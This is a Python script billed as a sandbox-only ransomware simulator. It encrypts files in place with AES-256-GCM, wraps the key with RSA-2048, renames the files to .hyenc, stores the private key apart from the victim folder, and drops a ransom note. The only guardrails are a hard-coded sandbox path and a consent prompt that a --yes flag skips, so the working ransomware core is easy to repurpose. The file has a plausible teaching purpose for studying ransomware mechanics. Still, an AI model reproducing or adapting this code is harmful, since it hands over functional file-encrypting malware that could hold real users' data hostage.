"""Hybrid encryption demo (safe, consent-based, sandbox-only).

This script demonstrates envelope encryption using:
- AES-256-GCM for file data
- RSA-2048 OAEP-SHA256 for wrapping the AES key

Safety boundaries:
- Hybrid Encryption Lab (Bulk Version).
- Requires explicit user confirmation text.
- Refuses paths outside C:\\RansomLab\\sandbox.
"""

from __future__ import annotations

import argparse
import os
from datetime import datetime
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Configuration
SANDBOX_PATH = Path(r"C:\RansomLab\sandbox")
KEYS_DIR = SANDBOX_PATH / "keys"
PUBLIC_KEY_PATH = KEYS_DIR / "public_key.pem"
# Store the private key outside the sandbox so only the public key remains there.
PRIVATE_KEY_PATH = Path(__file__).resolve().with_name("private_key.pem")
LOG_PATH = SANDBOX_PATH / "hybrid_demo.log"

ENCRYPTED_EXT = ".hyenc"
FILE_MAGIC = b"HYBDEMO1"
NONCE_SIZE = 12


def log(message: str) -> None:
    """Print and append a timestamped message to the sandbox log file."""
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{stamp}] {message}"
    print(line)

    try:
        if SANDBOX_PATH.exists() and SANDBOX_PATH.is_dir() and is_within_sandbox(LOG_PATH):
            with LOG_PATH.open("a", encoding="utf-8") as handle:
                handle.write(line + "\n")
    except OSError:
        pass


def is_within_sandbox(path: Path) -> bool:
    """Allow only paths whose resolved location is inside the sandbox root."""
    try:
        sandbox_resolved = SANDBOX_PATH.resolve(strict=False)
        path_resolved = path.resolve(strict=False)
        common = Path(os.path.commonpath([str(sandbox_resolved), str(path_resolved)]))
        return common == sandbox_resolved
    except ValueError:
        return False


def validate_sandbox() -> None:
    """Ensure sandbox exists and is a directory before any crypto operation."""
    if not SANDBOX_PATH.exists():
        raise RuntimeError(f"Sandbox path not found: {SANDBOX_PATH}")
    if not SANDBOX_PATH.is_dir():
        raise RuntimeError(f"Sandbox path is not a directory: {SANDBOX_PATH}")


def assert_safe_file_path(path: Path) -> None:
    """Reject file paths outside sandbox or directory paths."""
    if not is_within_sandbox(path):
        raise RuntimeError(f"Blocked path outside sandbox: {path}")
    if path.is_dir():
        raise RuntimeError(f"Expected a file but received a directory: {path}")


def print_banner() -> None:
    """Display simulator banner with ASCII art."""
    banner = """
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗██╗    ██╗██╗  ██╗███████╗██████╗ ███████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██║    ██║██║  ██║██╔════╝██╔══██╗██╔════╝
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║██║ █╗ ██║███████║█████╗  ██████╔╝█████╗  
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██║███╗██║██╔══██║██╔══╝  ██╔══██╗██╔══╝  
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║╚███╔███╔╝██║  ██║███████╗██║  ██║███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝

███████╗██╗███╗   ███╗██╗   ██╗██╗      █████╗ ████████╗ ██████╗ ██████╗ 
██╔════╝██║████╗ ████║██║   ██║██║     ██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
███████╗██║██╔████╔██║██║   ██║██║     ███████║   ██║   ██║   ██║██████╔╝
╚════██║██║██║╚██╔╝██║██║   ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗
███████║██║██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⡈⠐⠠⢁⠂⠐⢀⣾⣿⡿⠿⠿⠿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠿⣷⡄⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⠠⢁⠂⠄⠀⣛⠀⡟⢁⣠⣄⠀⠀⠀⠙⢻⡟⠉⠀⠀⢀⣴⣦⣬⠃⣬⣅⠀⢂⠐⡀⢂⠐⠠⠀⠄⠠⠀⠄⠠⢀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡁⢂⠈⠀⠾⡛⢱⡿⢿⣿⣿⣿⣦⣄⣠⣼⣷⣤⣤⣶⠿⠿⢿⣟⠆⢉⡛⠆⠀⢂⠐⠠⠈⠄⠡⠈⠄⠡⢈⠐⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡐⢀⠂⢠⣾⡟⣸⣰⡿⠁⠀⠀⠙⣿⡇⣿⣿⠸⣿⠁⢀⣀⣀⣙⡸⠎⢿⡆⠀⠂⠌⠠⠁⠌⠠⠁⠌⡐⢀⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⠀⠟⡸⢛⣤⣼⣿⣿⣿⣤⣼⠇⣿⣿⠀⢧⣿⣿⣿⣿⣿⣿⣧⣄⠃⠀⢃⠘⡀⢃⠘⡀⠃⠄⠠⢀⠘⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢂⠡⠈⠄⢈⡾⠋⢹⣿⣿⣿⣿⡟⢡⣴⣿⣿⣷⣦⡙⢿⣿⣿⣿⣿⠀⠙⠀⠈⡀⢂⠐⡀⠂⠄⠡⢈⠐⡀⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠄⢂⠡⠀⢸⠀⠀⢸⣿⣿⣿⣿⡀⣿⣿⣿⣿⣿⣿⡇⠸⢿⣿⣿⡟⠀⠀⠀⠀⡐⢀⠂⠄⠡⢈⠐⡀⢂⠐⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠄⡐⠠⠀⠀⠀⠀⠙⠋⠉⠀⠀⠉⠉⠙⠛⠋⠉⠀⠀⠀⠀⠁⠀⠀⠀⠀⢀⠐⠠⠈⠄⡁⢂⠐⡀⠂⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢈⠐⠠⠁⠄⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⢀⣀⠀⠀⢀⠂⠌⠠⢁⠂⡐⢀⠂⠄⠡⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⠈⠄⠡⢈⠐⡀⠸⣿⣦⡀⠀⠀⠛⠒⠚⠛⠛⠛⠛⠀⢀⣴⣿⠃⠀⠌⡀⠂⠌⡐⢀⠂⡐⠠⠈⠄⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠡⢈⠐⡀⠂⠄⠀⢻⣿⣿⣷⣶⣦⣤⣤⣤⣤⣤⣶⣾⣿⣿⡿⠀⠐⠠⢀⠁⢂⠐⡀⠂⠄⠡⢈⠐⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⡐⢀⠂⠄⠡⠈⠄⠘⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⡿⠃⠀⠌⡐⠠⠈⠄⠂⠄⠡⢈⠐⠠⠈⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡐⠠⠈⠄⠡⢈⠐⠀⠀⠙⠃⣿⣿⣿⣿⣿⣿⣿⣿⡗⠋⠀⣤⠀⠀⠀⠡⠈⠄⠡⢈⠐⠠⠈⠄⡁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠄⠡⠈⠄⡁⠂⠀⠀⣤⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⠇⣠⣾⣿⠀⣰⠀⠀⠀⣈⡀⠀⠈⠀⠁⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡈⠄⠁⠂⠀⠀⠀⠀⢻⣿⣷⠬⠉⠉⠉⠉⠉⠉⠀⠚⢿⣿⣿⢀⣿⡀⠀⠀⢹⣿⣿⣿⣿⣶⡶⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⢸⣧⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣾⣿⡇⠀⠁⠀⢻⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣟⡿⠀⠀⠀⠀⣿⣿⣦⠘⣿⣶⠖⣠⠆⠀⠀⢳⣤⡙⢿⣟⣼⣿⣿⡇⠀⠐⡀⠈⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⠃⠀⠀⠀⠀⢿⣿⣿⣷⣌⣿⣾⠏⠀⡀⠀⠸⡿⠿⠾⠿⠿⠿⠿⠷⠀⠀⠄⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢠⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⢠⠀⡄⣴⠀⠀⡄⠐⠀⠀⢻⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠠⠀⠀⠀⠀⢀⠀⠠⠀⠄⢂⠐⠠⢈⠐⡈⠐⡀⢂⠐⠘⢷⡭⠂⠄⡁⢂⠀⠈⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⠐⠠⠈⡐⠠⠈⠄⠡⠈⠄⡈⠐⡀⠂⠄⠡⠐⠠⠨⠄⠆⠠⠌⠠⠐⠠⢀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⡿⠿⠿⠀⣼⡿⠿⣿⡆⢠⣿⠿⢿⣷⠀⣼⡿⠿⣿⡆⢸⣿⠀⣿⡿⠿⠿⠀⠾⢿⣿⠿⠇⠘⣿⡄⣰⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣧⣤⡄⠀⢿⣧⣤⣤⡁⢨⣿⠀⢀⣿⠀⣿⡇⠀⠀⠁⢸⣿⠀⣿⣧⣤⡄⠀⠀⢸⣿⠀⠀⠀⠘⢿⣿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⡏⠁⠁⠀⣤⣍⣈⣿⡇⢸⣿⣀⣀⣿⠀⣿⣇⣀⣤⡄⢸⣿⠀⣿⣇⣉⣀⠀⠀⢸⣿⠀⠀⠀⠀⢸⣯⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠛⠃⠀⠀⠀⠙⠛⠛⠛⠁⠀⠛⠛⠛⠋⠀⠘⠛⠛⠛⠁⠘⠛⠀⠛⠛⠛⠛⠀⠀⠘⠛⠀⠀⠀⠀⠘⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
    print(banner)

def require_consent(force_yes: bool) -> None:
    """Require explicit operator acknowledgment unless --yes is provided."""
    if force_yes:
        return

    print("This demo will operate on files inside the sandbox only.")
    answer = input("Type I AGREE to continue: ").strip()
    if answer != "I AGREE":
        raise RuntimeError("Consent not provided. Aborting.")


def generate_rsa_keypair() -> None:
    """Generate RSA-2048 keypair with the public key in sandbox and private key outside it."""
    validate_sandbox()
    KEYS_DIR.mkdir(parents=True, exist_ok=True)

    if not is_within_sandbox(PUBLIC_KEY_PATH):
        raise RuntimeError("Refusing to write public key outside sandbox")
    if is_within_sandbox(PRIVATE_KEY_PATH):
        raise RuntimeError("Private key must be stored outside the sandbox")

    PRIVATE_KEY_PATH.parent.mkdir(parents=True, exist_ok=True)

    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()

    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    PRIVATE_KEY_PATH.write_bytes(private_pem)
    PUBLIC_KEY_PATH.write_bytes(public_pem)
    log(f"Generated keypair: {PUBLIC_KEY_PATH} | {PRIVATE_KEY_PATH}")


def load_public_key(path: Path):
    """Load RSA public key from PEM file."""
    assert_safe_file_path(path)
    return serialization.load_pem_public_key(path.read_bytes())


def load_private_key(path: Path):
    """Load RSA private key from PEM file."""
    if path.is_dir():
        raise RuntimeError(f"Expected a file but received a directory: {path}")
    return serialization.load_pem_private_key(path.read_bytes(), password=None)


def encrypt_file_hybrid(input_file: Path, public_key_file: Path) -> Path:
    """
    Encrypt one file using AES-256-GCM and wrap the AES key with RSA-2048.

    Output format:
    - magic(8)
    - wrapped_key_len(2)
    - nonce(12)
    - wrapped_key(variable)
    - ciphertext_and_tag(variable)
    """
    validate_sandbox()
    assert_safe_file_path(input_file)
    assert_safe_file_path(public_key_file)

    if not input_file.exists():
        raise RuntimeError(f"Input file not found: {input_file}")
    if input_file.suffix == ENCRYPTED_EXT:
        raise RuntimeError(f"Input already appears encrypted: {input_file}")

    output_file = input_file.with_name(input_file.name + ENCRYPTED_EXT)
    assert_safe_file_path(output_file)

    if output_file.exists():
        raise RuntimeError(f"Refusing to overwrite existing encrypted file: {output_file}")

    public_key = load_public_key(public_key_file)
    plaintext = input_file.read_bytes()

    aes_key = AESGCM.generate_key(bit_length=256)
    nonce = os.urandom(NONCE_SIZE)
    ciphertext = AESGCM(aes_key).encrypt(nonce, plaintext, None)

    wrapped_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    if len(wrapped_key) > 65535:
        raise RuntimeError("Wrapped key too large for demo file format")

    header = FILE_MAGIC + len(wrapped_key).to_bytes(2, "big") + nonce

    # In-place behavior: write encrypted blob to the original file, then rename to .hyenc.
    input_file.write_bytes(header + wrapped_key + ciphertext)
    input_file.rename(output_file)
    log(f"Encrypted one file in place: {input_file} -> {output_file}")
    create_ransom_note()
    return output_file


def decrypt_file_hybrid(encrypted_file: Path, private_key_file: Path) -> Path:
    """Decrypt one .hyenc file and restore original name/content in place."""
    validate_sandbox()
    assert_safe_file_path(encrypted_file)
    if not private_key_file.exists():
        raise RuntimeError(f"Private key not found: {private_key_file}")
    if private_key_file.is_dir():
        raise RuntimeError(f"Expected a file but received a directory: {private_key_file}")

    if not encrypted_file.exists():
        raise RuntimeError(f"Encrypted file not found: {encrypted_file}")
    if encrypted_file.suffix != ENCRYPTED_EXT:
        raise RuntimeError(f"Expected a {ENCRYPTED_EXT} file: {encrypted_file}")

    blob = encrypted_file.read_bytes()
    min_header = len(FILE_MAGIC) + 2 + NONCE_SIZE
    if len(blob) < min_header:
        raise RuntimeError("File too small to contain valid hybrid header")

    if blob[: len(FILE_MAGIC)] != FILE_MAGIC:
        raise RuntimeError("Invalid file magic; not a supported demo file")

    wrapped_len = int.from_bytes(blob[len(FILE_MAGIC): len(FILE_MAGIC) + 2], "big")
    nonce_start = len(FILE_MAGIC) + 2
    nonce_end = nonce_start + NONCE_SIZE
    wrapped_start = nonce_end
    wrapped_end = wrapped_start + wrapped_len

    if wrapped_end > len(blob):
        raise RuntimeError("Invalid wrapped key length in file header")

    nonce = blob[nonce_start:nonce_end]
    wrapped_key = blob[wrapped_start:wrapped_end]
    ciphertext = blob[wrapped_end:]

    private_key = load_private_key(private_key_file)
    aes_key = private_key.decrypt(
        wrapped_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    plaintext = AESGCM(aes_key).decrypt(nonce, ciphertext, None)

    original_name = encrypted_file.name[: -len(ENCRYPTED_EXT)]
    output_file = encrypted_file.with_name(original_name)
    assert_safe_file_path(output_file)

    if output_file.exists():
        raise RuntimeError(f"Refusing to overwrite existing restored file: {output_file}")

    # In-place behavior: write plaintext to the .hyenc file, then restore original filename.
    encrypted_file.write_bytes(plaintext)
    encrypted_file.rename(output_file)
    log(f"Decrypted one file in place: {encrypted_file} -> {output_file}")
    return output_file


def create_ransom_note() -> None:
    """Create a note.txt file in the sandbox with encryption information."""
    validate_sandbox()
    note_file = SANDBOX_PATH / "note.txt"
    content = (
        "RansomWhere Encryption Lab - Educational Demo\n"
        "================================================\n\n"
        "Your files have been encrypted for demonstration purposes.\n\n"
        "This is a SAFE, SANDBOX-ONLY educational simulation.\n"
        "No actual damage has been done to your system.\n\n"
        "Encryption Method: AES-256-GCM + RSA-2048 OAEP\n"
        "Public Key Location: " + str(PUBLIC_KEY_PATH) + "\n"
        "All encrypted files end with: .hyenc\n\n"
        "To restore files, use: python safe_ransomware_sim2.py decrypt --file <filename>\n"
    )
    try:
        note_file.write_text(content, encoding="utf-8")
        log(f"Created ransom note: {note_file}")
    except OSError as e:
        log(f"Warning: Could not write ransom note: {e}")


def main() -> None:
    """CLI entry point for safe single-file hybrid encryption demo."""
    parser = argparse.ArgumentParser(
        description="Safe sandbox-only hybrid crypto demo (AES-256 + RSA-2048)."
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    subparsers.add_parser("gen-keys", help="Generate RSA-2048 keypair in sandbox/keys.")

    encrypt_parser = subparsers.add_parser("encrypt", help="Encrypt one file inside sandbox.")
    encrypt_parser.add_argument("--file", required=True, help="Path to input file inside sandbox.")
    encrypt_parser.add_argument(
        "--public-key",
        default=str(PUBLIC_KEY_PATH),
        help="Path to RSA public key PEM (default: sandbox/keys/public_key.pem).",
    )
    encrypt_parser.add_argument("--yes", action="store_true", help="Skip interactive consent prompt.")

    decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt one .hyenc file inside sandbox.")
    decrypt_parser.add_argument("--file", required=True, help="Path to .hyenc file inside sandbox.")
    decrypt_parser.add_argument(
        "--private-key",
        default=str(PRIVATE_KEY_PATH),
        help="Path to RSA private key PEM (default: sandbox/keys/private_key.pem).",
    )
    decrypt_parser.add_argument("--yes", action="store_true", help="Skip interactive consent prompt.")

    args = parser.parse_args()

    try:
        if args.command == "gen-keys":
            print_banner()
            generate_rsa_keypair()
            return

        if args.command == "encrypt":
            require_consent(args.yes)
            encrypt_file_hybrid(Path(args.file), Path(args.public_key))
            return

        if args.command == "decrypt":
            require_consent(args.yes)
            decrypt_file_hybrid(Path(args.file), Path(args.private_key))
            return
    except Exception as exc:
        log(f"ERROR: {exc}")
        raise SystemExit(1) from exc


if __name__ == "__main__":
    main()
